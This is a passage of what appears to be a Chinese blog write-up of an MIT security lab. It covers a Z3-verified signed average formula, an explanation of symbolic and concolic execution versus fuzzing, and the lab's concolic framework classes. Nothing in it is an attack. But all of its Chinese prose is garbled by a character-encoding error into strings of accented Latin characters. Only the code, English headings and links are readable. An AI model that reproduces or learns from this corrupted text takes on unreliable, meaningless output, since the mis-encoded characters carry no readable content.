<p>å¯¹äºå¸¦ç¬¦å·å€¼çš„è¿ç®—è€Œè¨€ï¼Œé™åˆ¶åœ¨ 32 ä½å†…çš„æ­£ç¡®è®¡ç®—ä¾¿æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ç”¨ä¸Šé¢çš„å¼å­è¿›è¡Œè®¡ç®—åˆ™å¾ˆå®¹æ˜“è¢« Z3 æ‰¾åˆ°èƒ½å¯¼è‡´è¿ç®—ç»“æœé”™è¯¯çš„ä¾‹å­ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¸ºä»€ä¹ˆåœ¨æœ‰ç¬¦å·é™¤æ³•ä¸‹è®¡ç®—å‡ºæ¥çš„ç»“æœä¸ä¸€è‡´å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é¢˜ç›®ä¸­<del>MIT éå¸¸SBåœ°</del>å¯¹äºæ­£æ•°é™¤æ³•å…¶é€‰æ‹©<strong>å‘ä¸‹å–æ•´</strong>ï¼Œå¯¹äºè´Ÿæ•°é™¤æ³•çš„æˆªæ–­ï¼Œå…¶é€‰æ‹©çš„æ˜¯<strong>å‘ä¸Šå–æ•´</strong>ï¼Œä½†æˆ‘ä»¬çš„ç®—æ³•æ˜¯<strong>æ­£æ•°ä¸è´Ÿæ•°çš†å‘ä¸‹å–æ•´</strong>ï¼Œå› æ­¤è®¡ç®—ç»“æœå°±å‡ºç°äº†åå·®</p>
<p>ç”±äºæ­£æ•°éƒ¨åˆ†æ²¡æœ‰é—®é¢˜ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹è®¡ç®—ç»“æœä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œç‰¹æ®ŠåŒ–å¤„ç†ï¼Œ<strong>åœ¨ç»“æœä¸ºè´Ÿæ•°æ—¶å°†å‘ä¸‹å–æ•´å˜ä¸ºå‘ä¸Šå–æ•´</strong>ï¼Œå› æ­¤æœ€åçš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li>
<li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li>
</ul>
<p><strong>é¦–å…ˆæŒ‰ç…§æˆ‘ä»¬åŸæ¥çš„å…¬å¼è®¡ç®—å‡ºå‘ä¸‹å–æ•´çš„ç»“æœï¼Œæ¥ä¸‹æ¥å¯¹å…¶ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ä¸º 1 åˆ™å†åˆ¤æ–­å…¶ç§æœ‰éƒ¨åˆ†å¹³å‡å€¼çš„è®¡ç®—æ˜¯å¦å‘ç”Ÿæˆªæ–­ï¼ˆå³ç§æœ‰éƒ¨åˆ†å’Œæ˜¯å¦ä¸ºå¥‡æ•°ï¼‰ï¼Œè‹¥æ˜¯åˆ™è¯´æ˜ç»“æœå‘ç”Ÿäº†å‘ä¸‹å–æ•´ï¼Œæ­¤æ—¶å˜ä¸ºå‘ä¸Šå–æ•´å³å¯</strong></p>
<p>ç”±äºè¦å¯¹ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>z3.LShR()</code> å°†åˆå§‹è¿ç®—ç»“æœä½œä¸ºæ— ç¬¦å·æ•´å‹è¿›è¡Œå³ç§»æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ Challenge 1ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Interlude-what-are-symbolic-and-concolic-execution"><a href="#Interlude-what-are-symbolic-and-concolic-execution" class="headerlink" title="Interlude: what are symbolic and concolic execution?"></a>Interlude: what are symbolic and concolic execution?</h2><p>æ­£å¦‚æˆ‘ä»¬å‰é¢åœ¨ EXE çš„è®ºæ–‡ä¸­æ‰€è§ï¼Œç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§é€šè¿‡è§‚æµ‹ç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸‹å¦‚ä½•è¡¨ç°æ¥è¿›è¡Œç¨‹åºæµ‹è¯•çš„æ–¹æ³•ï¼Œé€šå¸¸è€Œè¨€å…¶ç›®çš„æ˜¯ä¸ºäº†è·å¾—æ›´é«˜çš„ <strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Code_coverage">ä»£ç è¦†ç›–ç‡</a></strong> ï¼ˆcode coverageï¼‰æˆ–æ˜¯ <strong>è·¯å¾„è¦†ç›–ç‡</strong> ï¼ˆpath coverageï¼‰ï¼Œåœ¨å®‰å…¨ä¸­å…¶æ¯”ä¼ ç»Ÿä»£ç æ‰§è¡Œæ›´èƒ½è§¦å‘ç½•è§çš„å¯èƒ½åŒ…å«æ¼æ´çš„ä»£ç è·¯å¾„</p>
<p>ä»æ›´é«˜å±‚æ¬¡è€Œè¨€ï¼Œè‹¥æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>ç”±äºç¨‹åºåŒ…å«åŸºäºè¾“å…¥çš„ä¸­é—´å€¼ï¼ˆä¾‹å¦‚è¾“å…¥ä¸¤ä¸ªæ•´å‹å¹¶è®¡ç®—å¹³å‡å€¼ï¼Œå¹¶å­˜æ”¾åœ¨ä¸€äº›å˜é‡ä¸­ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½è¾“å…¥ä¸è¿™äº›ä¸­é—´å€¼é—´çš„å…³ç³»ï¼Œé€šå¸¸è¿™é€šè¿‡å…è®¸å˜é‡æˆ–å†…å­˜ä½ç½®æœ‰  <em>å…·ä½“çš„</em> ï¼ˆconcreteï¼Œä¾‹å¦‚ 114514 è¿™æ ·çš„å®é™…å€¼ï¼‰ æˆ–  <em>ç¬¦å·çš„</em>  ï¼ˆsymbolicï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚æ„å»ºçš„ç¬¦å·å˜é‡ï¼‰ å€¼</li>
<li>æˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥æ¥ç¡®å®šè¦æ‰§è¡Œçš„æ§åˆ¶æµåˆ†æ”¯ï¼Œè¿™å½’ç»“äºåœ¨ç¨‹åºæ¯æ¬¡å‘ç”Ÿåˆ†æ”¯æ—¶æ„å»ºç¬¦å·çº¦æŸï¼Œåœ¨ç¨‹åºé€‰æ‹©ä¸€äº›ç‰¹å®šåˆ†æ”¯æ—¶æè¿°å¸ƒå°”æ¡ä»¶ï¼ˆä»¥ç¨‹åºåŸæœ‰è¾“å…¥çš„å½¢å¼ï¼‰ï¼›ç”±äºæˆ‘ä»¬æŒç»­ä¿å­˜ä¸­é—´å€¼ä¸ç¨‹åºåŸæœ‰è¾“å…¥çš„é—´éš™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦é€šè¿‡åŸæœ‰è¾“å…¥æ¥è®¡ç®—çº¦æŸï¼Œè¿™äº›çº¦æŸå°±åƒæˆ‘ä»¬åœ¨å‰æ–‡ä¸­ç”¨æ¥å¯»æ‰¾æ•´å‹ä¸­æ¼æ´çš„çº¦æŸï¼›ç¡®å®šæ§åˆ¶æµçº¦æŸéå¸¸é‡è¦ï¼Œå› ä¸ºè‹¥ç¨‹åºåˆå§‹æ—¶è¿›å…¥äº†ç‰¹å®šåˆ†æ”¯è·¯å¾„ï¼Œæˆ‘ä»¬æƒ³è¦çŸ¥é“å¦‚ä½•è®©ä»–èµ°åˆ°å¦ä¸€æ¡è·¯å¾„æ¥å¯»æ‰¾æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œåœ¨ EXE çš„è®ºæ–‡ä¸­ä½¿ç”¨äº†ä¸€ä¸ª C-to-C çš„ç¿»è¯‘å™¨æ¥åœ¨æ‰€æœ‰çš„åˆ†æ”¯ä¸Šæ’å…¥ä»–ä»¬çš„ä»£ç </li>
<li>å¯¹äºæ¯ä¸€æ¡ä¸Šè¿°åˆ†æ”¯ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šæ˜¯å¦æœ‰ä¸€ä¸ªè¾“å…¥èƒ½å¤Ÿè®©ç¨‹åºåœ¨ä¸€æ¡åˆ†æ”¯ä¸Šæ‰§è¡Œå¦ä¸€æ¡è·¯å¾„ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è€ƒè™‘æ•´ä¸ªæ§åˆ¶æµè·¯å¾„è€Œéå•ä¸ªè·¯å¾„ï¼‰ï¼Œè¿™å¸®åŠ©æˆ‘ä»¬åœ¨ç¨‹åºä¸­å¯»æ‰¾å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡è°ƒæ•´è¾“å…¥æ¥å½±å“çš„æ§åˆ¶æµæ¡ä»¶ï¼Œæ‰€æœ‰çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿéƒ½åŸºäº SMT æ±‚è§£å™¨æ¥å®Œæˆè¿™äº›å·¥ä½œ</li>
<li>æˆ‘ä»¬éœ€è¦ç¡®å®šæˆ‘ä»¬åœ¨æµ‹è¯•ä¸­å¯»æ‰¾çš„æ˜¯ä»€ä¹ˆï¼Œè¿™æ˜¯æˆ‘ä»¬ä»ç¨‹åºä¸­ç¡®ä¿  <em>ä¸å˜é‡</em>  ï¼ˆinvariantï¼‰æ¥è€ƒè™‘çš„æœ€ä½³æ–¹æ³•ï¼Œè€Œç¬¦å·æ‰§è¡Œå¯»æ‰¾æ”¹å˜è¿™äº›å¸¸é‡çš„è¾“å…¥ï¼ˆ<del>ğŸ‘´ä¹Ÿæ²¡å’‹è¯»æ˜ç™½ï¼Œå¯ä»¥çœ‹å®éªŒæ‰‹å†ŒåŸå¥</del>ï¼‰ï¼›æˆ‘ä»¬å¯ä»¥å¯»æ‰¾çš„äº‹ç‰©ä¹‹ä¸€æ˜¯<strong>ç¨‹åºå´©æºƒ</strong>ï¼ˆcrashesï¼Œå³ä¸å˜é‡æ˜¯  <em>æˆ‘ä»¬çš„ç¨‹åºä¸åº”å½“å´©æºƒ</em>  ï¼‰ï¼Œåœ¨ C ç¨‹åºä¸­è¿™éå¸¸æœ‰æ„ä¹‰ï¼Œå› ä¸º crashes é€šå¸¸æŒ‡ç¤ºäº†ä»£è¡¨æ¼æ´çš„å†…å­˜æŸåï¼Œåœ¨ Python è¿™æ ·æ›´é«˜çº§çš„è¯­è¨€ä¸­åœ¨è®¾è®¡ä¸Šå¹¶ä¸å­˜åœ¨å†…å­˜æŸåï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯»æ‰¾å¦‚ Python ä»£ç çº§çš„ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆä¾‹å¦‚ <code>eval()</code> ï¼‰æˆ–æ˜¯ç‰¹å®šäºæŸç§åº”ç”¨çš„å½±å“å®‰å…¨çš„ä¸å˜é‡</li>
<li>æœ€ç»ˆï¼Œå¯¹äºç»™å‡ºç¨‹åºä¸­æ‰€æœ‰å¯èƒ½æ‰§è¡Œçš„æ§åˆ¶æµè·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šè¯¥å°è¯•å“ªæ¡è·¯å¾„ï¼Œå› ä¸ºè·¯å¾„æ•°é‡ä¼šéšç€ç¨‹åºè§„æ¨¡çš„å¢å¤§è€Œå¿«é€Ÿå¢é•¿ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°è¯•æ‰€æœ‰çš„è·¯å¾„ï¼Œå› æ­¤ç¬¦å·æ‰§è¡Œç³»ç»Ÿé€šå¸¸åŒ…å«ç¡®å®šå“ªä¸€æ¡è·¯å¾„æ›´æœ‰å¸Œæœ›å‘ç°ç ´åä¸å˜é‡çš„æŸç§  <em>è°ƒåº¦å™¨</em>  ï¼ˆschedulerï¼‰æˆ–  <em>æœç´¢ç­–ç•¥</em>  ï¼ˆsearch strategyï¼‰ï¼Œä¸€ä¸ªç®€å•çš„æœç´¢ç­–ç•¥ä¾‹å­ä¾¿æ˜¯å°è¯•æœªæ‰§è¡Œè¿‡çš„è·¯å¾„ï¼Œè¿™ä»£è¡¨ç€æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ä¸æœªè¢«å‘ç°çš„æ¼æ´çš„å­˜åœ¨çš„å¯èƒ½æ€§</li>
</ul>
<p>ä¸ç¬¦å·æ‰§è¡Œç›¸å¯¹çš„ä¸€ä¸ªé€‰æ‹©æ˜¯  <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> ï¼ˆåˆç§° fuzz-testingï¼Œæ¨¡ç³Šæµ‹è¯•ï¼‰ï¼Œå…¶é€‰æ‹©äº†ä¸€ä¸ªéšæœºåŒ–æ–¹æ¡ˆï¼šä¸åŒäºå…³æ³¨è§¦å‘åº”ç”¨ä¸­ä¸åŒä»£ç è·¯å¾„çš„åŸå› ï¼Œfuzzing ä¼šåˆ›å»ºéšæœºçš„å…·ä½“å€¼äº¤ç»™ç¨‹åºæ‰§è¡Œå¹¶æ£€æŸ¥å…¶è¡Œä¸ºï¼›è™½ç„¶è¿™æ¯”ç¬¦å·æ‰§è¡Œæ›´ç®€å•ï¼Œä½†é€šå¸¸å¾ˆéš¾æ„é€ èƒ½æ»¡è¶³ç¨‹åºä»£ç ä¸­ä¸€äº›ç‰¹å®šæƒ…å†µçš„è¾“å…¥</p>
<p>æ„å»ºç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„ä¸€ä¸ªæŒ‘æˆ˜æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿéœ€è¦çŸ¥é“å¦‚ä½•åœ¨ç¬¦å·å€¼ä¸Šæ‰§è¡Œæ‰€æœ‰å¯èƒ½çš„æ“ä½œï¼ˆä¸Šé¢çš„ Step 1 &amp; 2ï¼‰ï¼Œåœ¨æœ¬ Lab ä¸­æˆ‘ä»¬å°†åœ¨ Python å¯¹è±¡ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæ•´å‹ä¸å­—ç¬¦ä¸²ï¼‰ä¸Šå®è·µï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è¿™å¾ˆæœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸º Python å¯¹è±¡å¯ä»¥å®ç°çš„æ“ä½œæœ‰å¾ˆå¤š</p>
<p>å¹¸è¿çš„æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæ›´ç®€å•çš„é€‰æ‹©â€”â€”  <em>æ··åˆæ‰§è¡Œ</em>  ï¼ˆ<strong>concolic execution</strong>ï¼‰ï¼Œä»‹äºå®Œå…¨éšæœºçš„æ¨¡ç³Šæµ‹è¯•ä¸å®Œå…¨çš„ç¬¦å·æ‰§è¡Œä¹‹é—´ï¼Œç›¸è¾ƒäºè·Ÿè¸ªçº¯å‡€çš„ç¬¦å·å€¼ï¼ˆå¦‚ EXE ä¸­æ‰€åšï¼‰ï¼Œå…¶æ€æƒ³æ˜¯ï¼šå¯¹äºä»è¾“å…¥ä¸­å¾—åˆ°çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åŒæ—¶ä¿å­˜ä¸€ä¸ªå…·ä½“å€¼ä¸ä¸€ä¸ªç¬¦å·å€¼</strong>ï¼Œç”±æ­¤ï¼š</p>
<ul>
<li>è‹¥æˆ‘ä»¬çš„ concolic system çŸ¥é“åº”ç”¨çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥åƒç¬¦å·æ‰§è¡Œé‚£æ ·è¿è¡Œï¼ˆé™¤äº†æˆ‘ä»¬è¿˜ä¼šåŒæ—¶ä¼ æ’­æ¯ä¸ªå€¼çš„ concrete éƒ¨åˆ†ï¼‰ï¼›ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ª concolic æ•´å‹å˜é‡ <code>aa</code> ä¸ <code>bb</code>ï¼Œå…¶æœ‰ç€å…·ä½“å€¼ <code>5</code> ä¸ <code>6</code> ï¼Œå¹¶å¯¹åº”ç¬¦å·è¡¨è¾¾å¼ <code>a</code> ä¸  <code>b</code>ï¼Œæ­¤æ—¶è‹¥åº”ç”¨åˆ›å»ºäº†ä¸€ä¸ªå˜é‡ <code>cc = aa + bb</code>ï¼Œå…¶ä¼šåŒæ—¶æœ‰ç€å…·ä½“å€¼ <code>11</code> åŠç¬¦å·è¡¨è¾¾å¼ <code>a + b</code>ï¼›ç±»ä¼¼åœ°ï¼Œè‹¥åº”ç”¨åœ¨ <code>cc == 12</code> çš„åˆ†æ”¯ä¸Šæ‰§è¡Œï¼Œç¨‹åºå¯ä»¥åƒåˆ†æ”¯ä¸ºå‡ä¸€æ ·æ‰§è¡Œï¼Œå¹¶è®°å½•å¯¹åº”çš„ç¬¦å·åˆ†æ”¯æ¡ä»¶ <code>a + b != 12</code></li>
<li>è‹¥æˆ‘ä»¬çš„ concolic system ä¸çŸ¥é“åº”ç”¨çš„å½“å‰è¡Œä¸ºï¼Œåº”ç”¨å°†åªä¼šå¾—åˆ°å…·ä½“çš„å€¼ï¼›ä¾‹å¦‚è‹¥åº”ç”¨å°† <code>cc</code> å†™å…¥æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯ä¼ é€’åˆ°å¤–éƒ¨åº“ä¸­ï¼Œä»£ç ä»å¯ä»¥ä½¿ç”¨å…·ä½“å€¼ <code>11</code> å¦‚åŒåº”ç”¨æ­£å¸¸è¿è¡Œé‚£æ ·ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p>å¯¹äºæœ¬ lab è€Œè¨€ï¼Œæ··åˆæ‰§è¡Œçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦å®Œå…¨å®Œæˆå¯¹ç¬¦å·å€¼çš„æ“ä½œæ”¯æŒï¼Œæˆ‘ä»¬åªéœ€è¦æ”¯æŒè¶³å¤Ÿå‘ç°æ¼æ´çš„æ“ä½œå³å¯ï¼ˆå®é™…ä¸Šå¤§éƒ¨åˆ†æŒ–æ´ç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œä¸è¿‡è‹¥åº”ç”¨æ‰§è¡Œäº†æˆ‘ä»¬æ‰€ä¸æ”¯æŒçš„æ“ä½œï¼Œæˆ‘ä»¬å°†å¤±å»å¯¹ç¬¦å·éƒ¨åˆ†çš„è·Ÿè¸ªï¼Œå¹¶æ— æ³•å¯¹è¿™äº›è·¯å¾„è¿›è¡Œç¬¦å·æ‰§è¡Œå¼çš„ï¼ˆsymbolic-execution-styleï¼‰æ¢ç´¢ï¼Œè‹¥æƒ³äº†è§£æ›´å¤šå¯ä»¥å‚è§  <a target="_blank" rel="noopener" href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a> </p>
<h2 id="Concolic-execution-for-integers"><a href="#Concolic-execution-for-integers" class="headerlink" title="Concolic execution for integers"></a>Concolic execution for integers</h2><p>é¦–å…ˆæˆ‘ä»¬å°†ä¸ºæ•´å‹å€¼æ„å»ºä¸€ä¸ªæ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œæœ¬ Lab ä¸ºæˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæä¾›çš„æ¡†æ¶ä»£ç ä½äº <code>symex/fuzzy.py</code> ä¸­ï¼Œå…¶å®ç°äº†å‡ ä¸ªé‡è¦çš„æŠ½è±¡å±‚ï¼š</p>
<ul>
<li><p><strong>æŠ½è±¡è¯­æ³•æ ‘</strong>ï¼ˆThe ASTï¼‰ï¼šä¸æ­¤å‰æˆ‘ä»¬åœ¨ <code>int-avg.py</code> ä¸­ä½¿ç”¨ Z3 è¡¨è¾¾å¼æ¥è¡¨ç¤ºç¬¦å·å€¼æ‰€ä¸åŒçš„æ˜¯ï¼Œæœ¬ Lab æ„å»ºäº†å…¶è‡ªå·±çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼‰æ¥è¡¨è¾¾ç¬¦å·è¡¨è¾¾å¼ï¼Œä¸€ä¸ª AST èŠ‚ç‚¹å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å˜é‡ï¼ˆ <code>sym_str</code> æˆ– <code>sym_int</code> å¯¹è±¡ï¼‰ã€ä¸€ä¸ªå¸¸é‡ï¼ˆ<code>const_int</code>ã€<code>const_str</code> æˆ– <code>const_bool</code> å¯¹è±¡ï¼‰ã€æˆ–æ˜¯ä¸€äº›å°†å…¶ä»– AST èŠ‚ç‚¹ä½œä¸ºå‚æ•°çš„å‡½æ•°æˆ–æ“ä½œç¬¦ï¼ˆä¾‹å¦‚ <code>sym_eq(a, b)</code> è¡¨ç¤ºå¸ƒå°”è¡¨è¾¾å¼ <code>a==b</code>ï¼Œå…¶ä¸­ <code>a</code> ä¸ <code>b</code> éƒ½æ˜¯ AST èŠ‚ç‚¹ï¼Œæˆ–æ˜¯ <code>sym_plus(a, b)</code> è¡¨ç¤ºæ•´å‹è¡¨è¾¾å¼ <code>a + b</code>ï¼‰</p>
<p>æ¯ä¸ª AST èŠ‚ç‚¹ <code>n</code> éƒ½å¯ä»¥ä½¿ç”¨ <code>z3expr(n)</code> è½¬åŒ–ä¸º Z3 è¡¨è¾¾å¼ï¼Œè¿™ç”±è°ƒç”¨ <code>n._z3expr</code> å®Œæˆï¼Œå³æ¯ä¸ª AST èŠ‚ç‚¹éƒ½å®ç°äº†è¿”å›å¯¹åº” Z3 è¡¨è¾¾å¼çš„ <code>_z3expr</code> æ–¹æ³•</p>
<p>æˆ‘ä»¬ä½¿ç”¨è‡ªå·±çš„ AST å±‚è€Œéä½¿ç”¨ Z3 çš„ç¬¦å·è¡¨ç¤ºçš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦å®ç°ä¸€äº› Z3 è¡¨ç¤ºéš¾ä»¥å®Œæˆçš„æ“ä½œï¼Œæ­¤å¤–æˆ‘ä»¬éœ€è¦åˆ†å‡ºä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è°ƒç”¨ Z3 çš„æ±‚è§£å™¨ï¼Œä»¥åœ¨ Z3 æ±‚è§£å™¨è€—æ—¶è¿‡é•¿æ—¶æ€æ­»è¿›ç¨‹â€”â€”å°†çº¦æŸå½’ä¸ºä¸å¯è§£ï¼ˆè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½å¤±å»è¿™äº›è·¯å¾„ï¼Œä½†è‡³å°‘æˆ‘ä»¬ä¼šè®©ç¨‹åºæ¢ç´¢å…¶ä»–è·¯å¾„ï¼‰ï¼›ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ AST èƒ½è®©æˆ‘ä»¬å°† Z3 çŠ¶æ€å®Œå…¨ç‹¬ç«‹åœ¨ fork å‡ºçš„è¿›ç¨‹é‡Œ</p>
</li>
<li><p><strong>æ··åˆå°è£…</strong>ï¼ˆThe concolic wrappersï¼‰ï¼šä¸ºäº†æ‹¦æˆª python-level çš„æ“ä½œå¹¶è¿›è¡Œæ··åˆæ‰§è¡Œï¼Œæˆ‘ä»¬å°†å¸¸è§„çš„ <code>int</code> ä¸ <code>str</code> å¯¹è±¡æ›¿æ¢æˆäº†æ··åˆçš„å­ç±»ï¼š<code>concolic_int</code> ç»§æ‰¿è‡ª <code>int</code> è€Œ <code>concolic_str</code> ç»§æ‰¿è‡ª <code>str</code>ï¼Œæ¯ä¸€ä¸ªæ··åˆå°è£…éƒ½åŒæ—¶å­˜å‚¨ä¸€ä¸ªå…·ä½“å€¼ï¼ˆ<code>self.__v</code> ï¼‰ä¸ä¸€ä¸ªç¬¦å·è¡¨è¾¾å¼ï¼ˆä¸ AST èŠ‚ç‚¹ï¼Œåœ¨ <code>self.__sym</code>ï¼‰ï¼Œå½“åº”ç”¨åœ¨è®¡ç®—æ··åˆå€¼è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ <code>a+1</code> ä¸­çš„ <code>a</code> ä¸º <code>concolic_int</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‹¦æˆªè¯¥æ“ä½œå¹¶è¿”å›ä¸€ä¸ªåŒæ—¶åŒ…å«å…·ä½“å€¼ä¸ç¬¦å·è¡¨è¾¾å¼çš„çš„æ··åˆå€¼</p>
<p>ä¸ºäº†å®ç°è¿™æ ·çš„æ‹¦æˆªæ“ä½œï¼Œæˆ‘ä»¬é‡è½½äº† <code>concolic_int</code> ä¸ <code>concolic_str</code> ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚ <code>concolic_int.__add__</code> åœ¨ä¸Šé¢çš„ä¾‹å­ <code>a + 1</code> ä¸­ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ··åˆå€¼è¡¨ç¤ºç»“æœ</p>
<p>åŸåˆ™ä¸Šæˆ‘ä»¬åº”è¯¥ä¹Ÿè¦æœ‰ä¸€ä¸ª <code>concolic_bool</code> ä½œä¸º <code>bool</code> çš„å­ç±»ï¼Œä¸å¹¸çš„æ˜¯åœ¨ Python ä¸­ <code>bool</code> ä¸èƒ½è¢«ç»§æ‰¿ï¼ˆå‚è§<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/functions.html#bool">è¿™é‡Œ</a> ä¸ <a target="_blank" rel="noopener" href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">è¿™é‡Œ</a>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬åˆ›å»ºäº†å‡½æ•° <code>concolic_bool</code> ä½œä¸ºä»£æ›¿ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ··åˆå¸ƒå°”å€¼æ—¶ï¼Œç¨‹åºä¼šæŒ‰å…¶å€¼è¿›è¡Œåˆ†æ”¯ï¼Œæ•… <code>concolic_bool</code> ä¹Ÿä¼šä¸ºå½“å‰è·¯å¾„æ¡ä»¶æ·»åŠ ä¸€ä¸ªçº¦æŸï¼ˆå¸ƒå°”å€¼çš„ç¬¦å·è¡¨è¾¾å¼ä¸å…·ä½“å€¼ç›¸ç­‰çš„çº¦æŸï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå…·ä½“çš„å¸ƒå°”å€¼</p>
</li>
<li><p><strong>å…·ä½“è¾“å…¥</strong>ï¼ˆThe concrete inputsï¼‰ï¼šåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ <code>concrete_values</code> å­—å…¸ä¸­ï¼Œåœ¨è¯¥å­—å…¸ä¸­å­˜å‚¨äº†ç¨‹åºè¾“å…¥çš„å­—ç¬¦ä¸²åå­—ï¼Œå¹¶å°†æ¯ä¸ªåå­—æ˜ å°„åˆ°å¯¹åº”çš„è¾“å…¥å€¼ï¼ˆæ•´å‹å˜é‡çš„å€¼ä¸ºpythonæ•´å‹ï¼Œå­—ç¬¦ä¸²å˜é‡ä¸ºpythonå­—ç¬¦ä¸²ï¼‰</p>
<p><code>concrete_value</code> è¢«è®¾ä¸ºå…¨å±€å˜é‡çš„åŸå› æ˜¯åº”ç”¨é€šè¿‡è°ƒç”¨ <code>fuzzy.mk_str(name)</code> æˆ– <code>fuzzy.mk_int(name)</code> æ¥åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸²æˆ–æ··åˆæ•´å‹ï¼Œå…¶è¿”å›ä¸€ä¸ªæ··åˆå€¼ï¼Œå…¶ä¸­çš„ç¬¦å·éƒ¨åˆ†ä¸ºä¸€ä¸ªæ–°çš„ AST èŠ‚ç‚¹å¯¹åº”åˆ°ä¸€ä¸ªåä¸º <code>name</code> çš„å˜é‡ï¼Œä½†å…·ä½“å€¼è¢«åœ¨ <code>concrete_values</code> ä¸­æŸ¥æ‰¾ï¼Œè‹¥å­—å…¸ä¸­æ²¡æœ‰ä¸ä¹‹å…³è”çš„å˜é‡ï¼Œç³»ç»Ÿå°†å…¶è®¾ä¸ºé»˜è®¤çš„åˆå§‹å€¼ï¼ˆæ•´å‹ä¸º0ï¼Œå­—ç¬¦ä¸²ä¸ºç©ºä¸²ï¼‰</p>
